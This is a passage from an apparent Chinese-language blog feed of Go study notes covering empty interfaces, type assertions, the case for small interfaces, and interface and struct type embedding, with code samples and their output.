class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> EmptyInterface <span class="keyword">interface</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法集合为空的接口类型就被称为<strong>空接口类型</strong>。</p><p>但是通常不需要自己显示定义这类空接口类型，可以直接使用 <code>interface{}</code> 这个类型字面值作为所有空接口类型的代表就可以了。</p><p>接口类型一旦被定义后，它就和其他 Go 类型一样可以用于声明变量，比如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err error   <span class="comment">// err是一个error接口类型的实例变量</span></span><br><span class="line"><span class="keyword">var</span> r io.Reader <span class="comment">// r是一个io.Reader接口类型的实例变量</span></span><br></pre></td></tr></table></figure><p>这些类型为接口类型的变量被称为<strong>接口类型变量</strong>，如果没有被显式赋予初值，接口类型变量的默认值为 nil。<br>如果要为接口类型变量显式赋予初值，我们就要为接口类型变量选择合法的右值。</p><p>如果一个变量的类型是空接口类型，由于空接口类型的方法集合为空，这就意味着任何类型都实现了空接口的方法集合，所以可以将任何类型的值作为右值，赋值给空接口类型的变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="number">15</span>   <span class="comment">// ok</span></span><br><span class="line">fmt.Printf(<span class="string">"%T \n"</span>, i)   <span class="comment">// int</span></span><br><span class="line"></span><br><span class="line">i = <span class="string">"hello, golang"</span>      <span class="comment">// ok</span></span><br><span class="line">fmt.Printf(<span class="string">"%T \n"</span>, i)   <span class="comment">// string</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> t T</span><br><span class="line">i = t  <span class="comment">// ok</span></span><br><span class="line">i = &amp;t <span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>空接口类型的这一可接受任意类型变量值作为右值的特性，让他成为 Go 加入泛型语法之前唯一一种具有“泛型”能力的语法元素，包括 Go 标准库在内的一些通用数据结构与算法的实现，都使用了空类型interface{}作为数据元素的类型，这样我们就无需为每种支持的元素类型单独做一份代码拷贝了。</p><p>Go 语言还支持接口类型变量赋值的“逆操作”，也就是通过接口类型变量“还原”它的右值的类型与值信息，这个过程被称为“<strong>类型断言（Type Assertion）</strong>”。类型断言通常使用下面的语法形式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v, ok := i.(T)</span><br></pre></td></tr></table></figure><p>如果接口类型变量 i 之前被赋予的值确为 T 类型的值，那么这个语句执行后，左侧“comma, ok”语句中的变量 ok 的值将为 true，变量 v 的类型为 T，它值会是之前变量 i 的右值。<br>如果 i 之前被赋予的值不是 T 类型的值，那么这个语句执行后，变量 ok 的值为 false，变量 v 的类型还是那个要还原的类型，但它的值是类型 T 的零值。</p><p>类型断言也支持下面这种语法形式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v := i.(T)</span><br></pre></td></tr></table></figure><p>但是在这种语法形式下，如果接口变量i 之前被赋予的值不是 T 类型的值，那么这个语句将抛出 panic。<br>因为可能会出现 panic，所以并不推荐使用这种语法形式。</p><p>下面用一段示例代码来加深一下理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a <span class="keyword">int64</span> = <span class="number">13</span></span><br><span class="line"><span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = a</span><br><span class="line">v1, ok := i.(<span class="keyword">int64</span>) </span><br><span class="line"><span class="comment">// 断言成功</span></span><br><span class="line">fmt.Printf(<span class="string">"v1=%d, the type of v1 is %T, ok=%t\n"</span>, v1, v1, ok)</span><br><span class="line">v2, ok := i.(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">// 断言失败，变量 i 的 int64 与 string 类型不一致</span></span><br><span class="line">fmt.Printf(<span class="string">"v2=%s, the type of v2 is %T, ok=%t\n"</span>, v2, v2, ok)</span><br><span class="line">v3 := i.(<span class="keyword">int64</span>) </span><br><span class="line"><span class="comment">// 断言成功</span></span><br><span class="line">fmt.Printf(<span class="string">"v3=%d, the type of v3 is %T, ok =%t\n"</span>, v3, v3, ok) </span><br><span class="line">v4 := i.([]<span class="keyword">int</span>)</span><br><span class="line">fmt.Printf(<span class="string">"the type of v4 is %T\n"</span>, v4)</span><br></pre></td></tr></table></figure><p>运行示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="number">13</span>, the <span class="keyword">type</span> of v1 is <span class="keyword">int64</span>, ok=<span class="literal">true</span></span><br><span class="line">v2=, the <span class="keyword">type</span> of v2 is <span class="keyword">string</span>, ok=<span class="literal">false</span></span><br><span class="line">v3=<span class="number">13</span>, the <span class="keyword">type</span> of v3 is <span class="keyword">int64</span>, ok =<span class="literal">false</span></span><br><span class="line"><span class="built_in">panic</span>: <span class="keyword">interface</span> conversion: <span class="keyword">interface</span> &#123;&#125; is <span class="keyword">int64</span>, not []<span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>在这段代码中，如果 <code>v, ok := i.(T)</code> 中的 T 是一个接口类型，那么类型断言的语义就会变成：断言 i 的值实现了接口类型 T。如果断言成功，变量 v 的类型为 i 的值的类型，而并非接口类型 T。如果断言失败，v 的类型信息为接口类型 T，它的值为 nil，下面再来看一个 T 为接口类型的示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInterface <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">int</span></span><br><span class="line">               </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T)</span> <span class="title">M1</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">"T's M1"</span>)</span><br><span class="line">&#125;              </span><br><span class="line">               </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> t T    </span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = t</span><br><span class="line">    v1, ok := i.(MyInterface)</span><br><span class="line">    <span class="keyword">if</span> !ok &#123;   </span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">"the value of i is not MyInterface"</span>)</span><br><span class="line">    &#125;          </span><br><span class="line">    v1.M1()    </span><br><span class="line">    fmt.Printf(<span class="string">"the type of v1 is %T\n"</span>, v1) <span class="comment">// the type of v1 is main.T</span></span><br><span class="line">               </span><br><span class="line">    i = <span class="keyword">int64</span>(<span class="number">13</span>)</span><br><span class="line">    v2, ok := i.(MyInterface)</span><br><span class="line">    fmt.Printf(<span class="string">"the type of v2 is %T\n"</span>, v2) <span class="comment">// the type of v2 is &lt;nil&gt;</span></span><br><span class="line">    <span class="comment">// v2 = 13 //  cannot use 1 (type int) as type MyInterface in assignment: int does not implement MyInterface (missing M1   method) </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，通过<code>the type of v2 is &lt;nil&gt;</code>，其实是看不出断言失败后的变量 v2 的类型的，但通过最后一行代码的编译器错误提示，我们能清晰地看到 v2 的类型信息为 MyInterface。</p><h2 id="尽量定义小接口"><a href="#尽量定义小接口" class="headerlink" title="尽量定义小接口"></a>尽量定义小接口</h2><p>而 Go 选择了去繁就简的形式，这主要体现在以下两点上：</p><h3 id="隐式契约"><a href="#隐式契约" class="headerlink" title="隐式契约"></a>隐式契约</h3><p>Go 语言中接口类型与它的实现者之间的关系是隐式的，不需要像其他语言（比如 Java）那样要求实现者显式放置“implements”进行修饰，实现者只需要实现接口方法集合中的全部方法便算是遵守了契约，并立即生效了。</p><h3 id="更倾向于“小契约”"><a href="#更倾向于“小契约”" class="headerlink" title="更倾向于“小契约”"></a>更倾向于“小契约”</h3><p>如果契约太繁杂了就会束缚了手脚，缺少了灵活性，抑制了表现力。所以 Go 选择了使用“小契约”，表现在代码上就是<strong>尽量定义小接口，即方法个数在 1~3 个之间的接口</strong>。Go 语言之父 Rob Pike 曾说过的“接口越大，抽象程度越弱”，这也是 Go 社区倾向定义小接口的另外一种表述。</p><h2 id="小接口有哪些优势"><a href="#小接口有哪些优势" class="headerlink" title="小接口有哪些优势"></a>小接口有哪些优势</h2><h3 id="接口越小，抽象程度越高"><a href="#接口越小，抽象程度越高" class="headerlink" title="接口越小，抽象程度越高"></a>接口越小，抽象程度越高</h3><h3 id="小接口易于实现和测试"><a href="#小接口易于实现和测试" class="headerlink" title="小接口易于实现和测试"></a>小接口易于实现和测试</h3><p>这是一个显而易见的优点。小接口拥有比较少的方法，一般情况下只有一个方法。所以要想满足这一接口，只需要实现一个方法或者少数几个方法就可以了，这显然要比实现拥有较多方法的接口要容易得多。</p><p>尤其是在单元测试环节，构建类型去实现只有少量方法的接口要比实现拥有较多方法的接口付出的劳动要少许多。</p><h3 id="小接口表示的“契约”职责单一，易于复用组合"><a href="#小接口表示的“契约”职责单一，易于复用组合" class="headerlink" title="小接口表示的“契约”职责单一，易于复用组合"></a>小接口表示的“契约”职责单一，易于复用组合</h3><p>Go 推崇通过组合的方式构建程序。Go 开发人员一般会尝试通过嵌入其他已有接口类型的方式来构建新接口类型，就像通过嵌入 io.Reader 和 io.Writer 构建 io.ReadWriter 那样。</p><p>那构建时，如果有众多候选接口类型供选择，该怎么选择呢？<br>选择那些新接口类型需要的契约职责，同时也要求不要引入我们不需要的契约职责。在这样的情况下，拥有单一或少数方法的小接口便更有可能成为我们的目标，而那些拥有较多方法的大接口，可能会因引入了诸多不需要的契约职责而被放弃。</p><p>由此可见，小接口更契合 Go 的组合思想，也更容易发挥出组合的威力。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>接口类型定义中嵌入的不同接口类型的方法集合若存在交集，交集中的方法不仅名字要一样，函数签名也要相同，否则会编译失败</li><li>对接口类型和非接口类型进行类型断言的语义是不完全相同的</li><li>Go 惯例上推荐尽量定义小接口，即方法个数在 1～3 个之间</li><li>小接口有诸多优点，比如，抽象程度高、易于测试与实现、与组合的设计思想一脉相承</li><li>接口本质是契约，具有天然的降低耦合的作用</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——类型嵌入</title>
      <link href="/go-language-study-notes-embedded-type/"/>
      <url>/go-language-study-notes-embedded-type/</url>
      
        <content type="html"><![CDATA[<p>前两篇笔记主要了解了 Go 方法的声明、本质，以及 receiver 类型选择的三个原则，这篇笔记主要来了解 Go 语言的组合思想——类型嵌入。</p><a id="more"></a><h2 id="类型嵌入"><a href="#类型嵌入" class="headerlink" title="类型嵌入"></a>类型嵌入</h2><p>什么是类型嵌入？<br>类型嵌入指的是在一个类型的定义中嵌入了其他类型。Go 语言支持两种类型嵌入，分别是接口类型的类型嵌入和结构体类型的类型嵌入。</p><h3 id="接口类型嵌入"><a href="#接口类型嵌入" class="headerlink" title="接口类型嵌入"></a>接口类型嵌入</h3><p>接口类型声明了由一个方法集合代表的接口，比如下面接口类型 E：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> E <span class="keyword">interface</span> &#123;</span><br><span class="line">  M1()</span><br><span class="line">  M2()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个接口类型 E 的方法集合，包含两个方法，分别是 M1 和 M2，它们组成了 E 这个接口类型所代表的接口。<br>如果某个类型实现了方法 M1 和 M2，就可以说这个类型实现了 E 所代表的接口。</p><p>此时，再定义另外一个接口类型 I，它的方法集合中包含了三个方法M1、M2、和 M3：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">  M1()</span><br><span class="line">  M2()</span><br><span class="line">  M3()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口类型 I 的方法集合中定义的 M1、M2 和接口类型 E 的方法集合中的方法完全相同。<br>这种情况下，可以直接使用接口类型 E 替代上面接口类型 I 定义的 M1 和 M2：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">  E</span><br><span class="line">  M3()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像这种在一个接口类型（I）定义中，嵌入另外一个接口类型（E）的方式，就是<strong>接口类型的类型嵌入</strong>。</p><p>而且，这个带有类型嵌入的接口类型 I的定义与上面那个包含 M1、M2、M3 的接口类型 I 的定义，是等价的。<br>因此可以得出一个结论：<strong>接口类型嵌入的语义就是新接口类型（I）将嵌入接口类型（E）的方法集合，并入到自己的方法集合中</strong>。</p><p>到这里你可能会问，既然都是等价的，那么直接在接口类型定义中平铺方法列表就好了，为啥要使用类型嵌入方式定义接口类型呢？其实这也是 <strong>Go 组合设计哲学的一种体现</strong>。</p><p>按 Go 语言惯例，Go 中的接口类型中只包含少量方法，并且常常只是一个方法。通过在接口类型中嵌入其他接口类型可以实现接口的组合，这也是 <strong>Go 语言中基于已有接口类型构建新接口类型的惯用法</strong>。</p><h3 id="结构体类型嵌入"><a href="#结构体类型嵌入" class="headerlink" title="结构体类型嵌入"></a>结构体类型嵌入</h3><p>其实在前面的结构体笔记中，有简单用到过结构体类型嵌入，但是没有深入了解，那么接下来了解一下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T1 <span class="keyword">int</span></span><br><span class="line"><span class="keyword">type</span> t2 <span class="keyword">struct</span>&#123;</span><br><span class="line">    n <span class="keyword">int</span></span><br><span class="line">    m <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> S1 <span class="keyword">struct</span> &#123;</span><br><span class="line">    T1</span><br><span class="line">    *t2</span><br><span class="line">    I            </span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">    b <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要注意 🚧，如果定义成这样，就不是嵌入字段了，因此不会继承接口的方法集合，也就不能直接调用 S1.M1() 了</span></span><br><span class="line"><span class="comment">/*type S1 struct &#123;</span></span><br><span class="line"><span class="comment">    T1 T1</span></span><br><span class="line"><span class="comment">    t2 *t2</span></span><br><span class="line"><span class="comment">    I I            </span></span><br><span class="line"><span class="comment">    a int</span></span><br><span class="line"><span class="comment">    b string</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><p>上面的示例代码是一个带有<strong>嵌入字段（Embedded Field）的结构体定义</strong>。</p><p>可以看到，结构体 S1 定义中有三个“非常规形式” 的标识符，分别是 T1、<code>*t2</code>、和 I，像这种“非常规形式” 的标识符既代表字段的名字，也代表字段的类型：</p><ul><li>T1：字段名为 T1，类型为自定义类型 T1</li><li><code>*t2</code>：字段名为 t2，类型为自定义结构体类型 t2 的指针类型</li><li>I：字段名为 I，类型为接口类型 I</li></ul><p>这种以某个类型名、类型的指针类型名或接口类型名，直接作为结构体字段的方式就叫做<strong>结构体的类型嵌入</strong>，这些字段也被叫做<strong>嵌入字段（Embedded Field）</strong>。</p><h2 id="“继承”原理"><a href="#“继承”原理" class="headerlink" title="“继承”原理"></a>“继承”原理</h2><p>嵌入字段具体有什么用呢？它跟普通结构体字段又有什么不同？下面结合一段示例代码来具体说明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> MyInt <span class="keyword">int</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(n *MyInt)</span> <span class="title">Add</span><span class="params">(m <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    *n = *n + MyInt(m)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> t <span class="keyword">struct</span> &#123;</span><br><span class="line">    a <span class="keyword">int</span></span><br><span class="line">    b <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> S <span class="keyword">struct</span> &#123;</span><br><span class="line">    *MyInt</span><br><span class="line">    t</span><br><span class="line">    io.Reader</span><br><span class="line">    s <span class="keyword">string</span></span><br><span class="line">    n <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    m := MyInt(<span class="number">17</span>)</span><br><span class="line">    r := strings.NewReader(<span class="string">"hello, go"</span>)</span><br><span class="line">    s := S&#123;</span><br><span class="line">        MyInt: &amp;m,</span><br><span class="line">        t: t&#123;</span><br><span class="line">            a: <span class="number">1</span>,</span><br><span class="line">            b: <span class="number">2</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        Reader: r,</span><br><span class="line">        s:      <span class="string">"demo"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> sl = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(<span class="string">"hello, go"</span>))</span><br><span class="line">    s.Reader.Read(sl)</span><br><span class="line">    fmt.Println(<span class="keyword">string</span>(sl)) <span class="comment">// hello, go</span></span><br><span class="line">    s.MyInt.Add(<span class="number">5</span>)</span><br><span class="line">    fmt.Println(*(s.MyInt)) <span class="comment">// 22</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，结构体类型 S 使用了类型嵌入方式进行定义，嵌入了三个字段Myint、t、以及 Reader。</p><p>第三个嵌入字段的名字为 Reader 而不是 io.Reader 的原因是，Go 语言规定如果结构体使用从其他包导入的类型作为嵌入字段，比如 pkg.T，那么这个嵌入字段的字段名就是 T，代表的类型为 pkg.T。</p><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello, <span class="keyword">go</span></span><br><span class="line"><span class="number">22</span></span><br></pre></td></tr></table></figure><p>这样看起来，使用嵌入字段和普通字段似乎并没有什么差别，输出都是一样的。</p><p>将 main 函数中，部分代码替换成下面这部分：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sl = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(<span class="string">"hello, go"</span>))</span><br><span class="line">s.Read(sl) </span><br><span class="line">fmt.Println(<span class="keyword">string</span>(sl))</span><br><span class="line">s.Add(<span class="number">5</span>) </span><br><span class="line">fmt.Println(*(s.MyInt))</span><br></pre></td></tr></table></figure><p>这里可能会有疑问，类型 S 又没有定义 Read 方法和 Add 方法，这样写不会编译失败吗？</p><p>再次运行示例代码，会发现不但没有编译失败，程序还正常输出了。</p><p>之所以没有编译失败，是因为这两个方法就是来自于结构体类型 S 的两个嵌入字段 Reader 和 MyInt。<br>结构体类型 S“继承”了 Reader 字段的方法 Read 的实现，也“继承”了 <code>*MyInt</code> 的 Add 方法的实现。</p><p>这里的”继承“打了引号，并不是真正意义上的继承，只是使用了这一语义。</p><p>其原理是通过结构体类型 S 的实例 s 调用 Read 方法时，Go 发现结构体类型 S 自身并没有定义 Read 方法，于是 Go 会查看 S 的嵌入字段对应的类型是否定义了 Read 方法。这个时候，Reader 字段就被找了出来，之后 <code>s.Read</code> 的调用就被转换为 <code>s.Reader.Read</code> 调用。</p><p>这种将调用“委派”给该结构体内部嵌入类型的实例去执行，叫做委派模式。</p><p>当外界调用新类型的方法时，Go 编译器会首先查找新类型是否实现了这个方法，如果没有，就会将调用委派给其内部实现了这个方法的嵌入类型的实例去执行</p><p>Add 方法的调用原理同上。</p><p>因此，现在就清楚了嵌入字段的作用，它可以用来<strong>实现方法的“继承”</strong>。</p><h2 id="类型嵌入与方法集合"><a href="#类型嵌入与方法集合" class="headerlink" title="类型嵌入与方法集合"></a>类型嵌入与方法集合</h2><p>在前面讲解接口类型的类型嵌入时，我们提到过接口类型的类型嵌入的本质，就是<strong>嵌入类型的方法集合并入到新接口类型的方法集合中</strong>，并且，<strong>接口类型只能嵌入接口类型</strong>。而<strong>结构体类型对嵌入类型的要求就比较宽泛了</strong>，<strong>可以是任意自定义类型或接口类型</strong>。</p><p>下面就分别来看看，在这两种情况下，结构体类型的方法集合会有怎样的变化。<br>这里借助前面笔记中的 dumpMethodSet 工具函数来输出各个类型的方法集合。</p><h3 id="结构体类型中嵌入接口类型"><a href="#结构体类型中嵌入接口类型" class="headerlink" title="结构体类型中嵌入接口类型"></a>结构体类型中嵌入接口类型</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">    M2()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    I</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T)</span> <span class="title">M3</span><span class="params">()</span></span> &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> t T</span><br><span class="line">    <span class="keyword">var</span> p *T</span><br><span class="line">    dumpMethodSet(t)</span><br><span class="line">    dumpMethodSet(p)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main.T&#39;s method set:</span><br><span class="line">- M1</span><br><span class="line">- M2</span><br><span class="line">- M3</span><br><span class="line">*main.T&#39;s method set:</span><br><span class="line">- M1</span><br><span class="line">- M2</span><br><span class="line">- M3</span><br></pre></td></tr></table></figure><p>可以看到，原本结构体类型 T 只带有一个方法 M3，但在嵌入接口类型 I 后，结构体类型 T 的方法集合中又并入了接口类型 I 的方法集合。</p><p>所以，结论就是：<strong>结构体类型的方法集合，包含嵌入的接口类型的方法集合</strong>。</p><p>不过这里需要注意：和前面接口类型中嵌入接口类型，不同的是，结构体类型嵌入接口类型不允许方法集合存在交集。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> E1 <span class="keyword">interface</span> &#123;</span><br><span class="line">    M1()</span><br><span class="line">    M2()</span><br><span class="line">    M3()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> E2 <span class="keyword">interface</span> &#123;</span><br><span class="line">   M1()</span><br><span class="line">   M2()</span><br><span class="line">   M4()</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">   E1</span><br><span class="line">   E2</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   t := T&#123;&#125;</span><br><span class="line">   t.M1()</span><br><span class="line">   t.M2()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上面的示例代码，会发现编译失败：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main.<span class="keyword">go</span>:<span class="number">22</span>:<span class="number">3</span>: ambiguous selector t.M1</span><br><span class="line">main.<span class="keyword">go</span>:<span class="number">23</span>:<span class="number">3</span>: ambiguous selector t.M2</span><br></pre></td></tr></table></figure><p>这是因为两个接口类型中都存在 M1 与 M2 方法，在结构体没有实现这两个方法的情况下，编译器无法自己做出选择。</p><p>解决方案也很简单：</p><ol><li>消除接口类型中重复定义的方法</li><li>为结构体增加 M1、M2 方法的实现</li></ol><h3 id="结构体类型中嵌入结构体类型"><a href="#结构体类型中嵌入结构体类型" class="headerlink" title="结构体类型中嵌入结构体类型"></a>结构体类型中嵌入结构体类型</h3><p>前面已经了解了，在结构体类型中嵌入结构体类型，<br>可以作为实现”继承“的手段。</p><p>外部的结构体类型 T 可以“继承”嵌入的结构体类型的所有方法的实现。并且，无论是 <code>T</code> 类型的变量实例还是 <code>*T</code> 类型变量实例，都可以调用所有“继承”的方法。</p><p>但这种情况下，<strong>带有嵌入类型的新类型究竟“继承”了哪些方法</strong>，通过下面的示例来看一下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> T1 <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(T1)</span> <span class="title">T1M1</span><span class="params">()</span></span>   &#123; <span class="built_in">println</span>(<span 